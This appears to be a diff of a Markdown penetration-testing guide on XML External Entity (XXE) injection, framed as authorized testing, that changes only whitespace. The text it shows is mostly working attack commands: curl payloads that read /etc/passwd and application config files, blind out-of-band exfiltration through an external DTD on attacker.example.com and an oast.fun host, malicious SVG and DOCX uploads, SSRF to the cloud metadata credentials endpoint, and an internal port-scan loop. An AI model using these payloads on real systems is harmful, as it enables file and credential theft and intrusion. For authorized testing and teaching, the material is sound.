@@ -1,8 +1,8 @@
 ---
 name: testing-for-xxe-injection-vulnerabilities
 description: Discovering and exploiting XML External Entity injection vulnerabilities
-  to read server files, perform SSRF, and exfiltrate data during authorized penetration
-  tests.
+ to read server files, perform SSRF, and exfiltrate data during authorized penetration
+ tests.
 domain: cybersecurity
 subdomain: web-application-security
 tags:
@@ -60,15 +60,15 @@ Find all application endpoints that accept or process XML data.
 # Test if JSON endpoints also accept XML
 # Original JSON request:
 curl -s -X POST \
-  -H "Content-Type: application/json" \
-  -d '{"search":"test"}' \
-  "https://target.example.com/api/search"
+ -H "Content-Type: application/json" \
+ -d '{"search":"test"}' \
+ "https://target.example.com/api/search"
 
 # Try converting to XML:
 curl -s -X POST \
-  -H "Content-Type: application/xml" \
-  -d '<?xml version="1.0"?><root><search>test</search></root>' \
-  "https://target.example.com/api/search"
+ -H "Content-Type: application/xml" \
+ -d '<?xml version="1.0"?><root><search>test</search></root>' \
+ "https://target.example.com/api/search"
 
 # Check file upload endpoints for XML-based formats
 # DOCX, XLSX, PPTX, SVG, PDF, XML, RSS, ATOM, SOAP
@@ -76,10 +76,10 @@ curl -s -X POST \
 
 # Check for SOAP endpoints
 curl -s -X POST \
-  -H "Content-Type: text/xml" \
-  -H "SOAPAction: \"\"" \
-  -d '<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><test/></soap:Body></soap:Envelope>' \
-  "https://target.example.com/ws/service"
+ -H "Content-Type: text/xml" \
+ -H "SOAPAction: \"\"" \
+ -d '<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><test/></soap:Body></soap:Envelope>' \
+ "https://target.example.com/ws/service"
 ```
 
 ### Step 2: Test for Basic XXE with File Retrieval
@@ -89,43 +89,43 @@ Inject XML entities to read local files from the server.
 ```bash
 # Basic XXE payload to read /etc/passwd
 curl -s -X POST \
-  -H "Content-Type: application/xml" \
-  -d '<?xml version="1.0" encoding="UTF-8"?>
+ -H "Content-Type: application/xml" \
+ -d '<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+ <!ENTITY xxe SYSTEM "file:///etc/passwd">
 ]>
 <root><search>&xxe;</search></root>' \
-  "https://target.example.com/api/search"
+ "https://target.example.com/api/search"
 
 # Windows file read
 curl -s -X POST \
-  -H "Content-Type: application/xml" \
-  -d '<?xml version="1.0" encoding="UTF-8"?>
+ -H "Content-Type: application/xml" \
+ -d '<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
+ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
 ]>
 <root><search>&xxe;</search></root>' \
-  "https://target.example.com/api/search"
+ "https://target.example.com/api/search"
 
 # Read application configuration files
 curl -s -X POST \
-  -H "Content-Type: application/xml" \
-  -d '<?xml version="1.0" encoding="UTF-8"?>
+ -H "Content-Type: application/xml" \
+ -d '<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "file:///var/www/html/config.php">
+ <!ENTITY xxe SYSTEM "file:///var/www/html/config.php">
 ]>
 <root><search>&xxe;</search></root>' \
-  "https://target.example.com/api/search"
+ "https://target.example.com/api/search"
 
 # PHP filter wrapper for base64 encoding (avoids XML parsing errors)
 curl -s -X POST \
-  -H "Content-Type: application/xml" \
-  -d '<?xml version="1.0" encoding="UTF-8"?>
+ -H "Content-Type: application/xml" \
+ -d '<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
+ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
 ]>
 <root><search>&xxe;</search></root>' \
-  "https://target.example.com/api/search"
+ "https://target.example.com/api/search"
 ```
 
 ### Step 3: Test Blind XXE with Out-of-Band Detection
@@ -138,36 +138,36 @@ When the entity value is not reflected in the response, use out-of-band techniqu
 # Use the generated domain: abc123.oast.fun
 
 curl -s -X POST \
-  -H "Content-Type: application/xml" \
-  -d '<?xml version="1.0" encoding="UTF-8"?>
+ -H "Content-Type: application/xml" \
+ -d '<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "http://abc123.oast.fun/xxe-test">
+ <!ENTITY xxe SYSTEM "http://abc123.oast.fun/xxe-test">
 ]>
 <root><search>&xxe;</search></root>' \
-  "https://target.example.com/api/search"
+ "https://target.example.com/api/search"
 
 # Check interactsh/Collaborator for incoming DNS or HTTP requests
 
 # Blind XXE with DNS exfiltration
 curl -s -X POST \
-  -H "Content-Type: application/xml" \
-  -d '<?xml version="1.0" encoding="UTF-8"?>
+ -H "Content-Type: application/xml" \
+ -d '<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "http://xxe-confirmed.abc123.oast.fun">
+ <!ENTITY xxe SYSTEM "http://xxe-confirmed.abc123.oast.fun">
 ]>
 <root><search>&xxe;</search></root>' \
-  "https://target.example.com/api/search"
+ "https://target.example.com/api/search"
 
 # Blind XXE via parameter entities (when regular entities are blocked)
 curl -s -X POST \
-  -H "Content-Type: application/xml" \
-  -d '<?xml version="1.0" encoding="UTF-8"?>
+ -H "Content-Type: application/xml" \
+ -d '<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
-  <!ENTITY % xxe SYSTEM "http://abc123.oast.fun/xxe-param">
-  %xxe;
+ <!ENTITY % xxe SYSTEM "http://abc123.oast.fun/xxe-param">
+ %xxe;
 ]>
 <root><search>test</search></root>' \
-  "https://target.example.com/api/search"
+ "https://target.example.com/api/search"
 ```
 
 ### Step 4: Exfiltrate Data via Out-of-Band XXE
@@ -189,14 +189,14 @@ cd /tmp && python3 -m http.server 8888 &
 
 # Send the XXE payload referencing the external DTD
 curl -s -X POST \
-  -H "Content-Type: application/xml" \
-  -d '<?xml version="1.0" encoding="UTF-8"?>
+ -H "Content-Type: application/xml" \
+ -d '<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
-  <!ENTITY % dtd SYSTEM "http://attacker.example.com:8888/evil.dtd">
-  %dtd;
+ <!ENTITY % dtd SYSTEM "http://attacker.example.com:8888/evil.dtd">
+ %dtd;
 ]>
 <root><search>test</search></root>' \
-  "https://target.example.com/api/search"
+ "https://target.example.com/api/search"
 
 # For multi-line file exfiltration, use FTP protocol
 # evil-ftp.dtd:
@@ -220,18 +220,18 @@ Test XML parsing in document upload functionality.
 cat > /tmp/xxe.svg << 'EOF'
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE svg [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+ <!ENTITY xxe SYSTEM "file:///etc/passwd">
 ]>
 <svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
-  <text x="0" y="20">&xxe;</text>
+ <text x="0" y="20">&xxe;</text>
 </svg>
 EOF
 
 # Upload the SVG
 curl -s -X POST \
-  -F "file=@/tmp/xxe.svg;type=image/svg+xml" \
-  -b "session=abc123" \
-  "https://target.example.com/api/upload/avatar"
+ -F "file=@/tmp/xxe.svg;type=image/svg+xml" \
+ -b "session=abc123" \
+ "https://target.example.com/api/upload/avatar"
 
 # DOCX file with XXE (DOCX is a ZIP containing XML files)
 mkdir -p /tmp/xxe-docx
@@ -254,33 +254,33 @@ Use XXE to make the server send requests to internal services.
 ```bash
 # SSRF via XXE to cloud metadata
 curl -s -X POST \
-  -H "Content-Type: application/xml" \
-  -d '<?xml version="1.0" encoding="UTF-8"?>
+ -H "Content-Type: application/xml" \
+ -d '<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
+ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
 ]>
 <root><search>&xxe;</search></root>' \
-  "https://target.example.com/api/search"
+ "https://target.example.com/api/search"
 
 # Internal port scanning via XXE
 for port in 22 80 443 3306 5432 6379 8080 8443 9200; do
-  echo -n "Port $port: "
-  curl -s -X POST --max-time 5 \
-    -H "Content-Type: application/xml" \
-    -d "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1:$port/\">]><root><search>&xxe;</search></root>" \
-    "https://target.example.com/api/search" | head -c 100
-  echo
+ echo -n "Port $port: "
+ curl -s -X POST --max-time 5 \
+ -H "Content-Type: application/xml" \
+ -d "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1:$port/\">]><root><search>&xxe;</search></root>" \
+ "https://target.example.com/api/search" | head -c 100
+ echo
 done
 
 # Access internal services
 curl -s -X POST \
-  -H "Content-Type: application/xml" \
-  -d '<?xml version="1.0" encoding="UTF-8"?>
+ -H "Content-Type: application/xml" \
+ -d '<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "http://internal-admin.local:8080/admin">
+ <!ENTITY xxe SYSTEM "http://internal-admin.local:8080/admin">
 ]>
 <root><search>&xxe;</search></root>' \
-  "https://target.example.com/api/search"
+ "https://target.example.com/api/search"
 ```
 
 ## Key Concepts
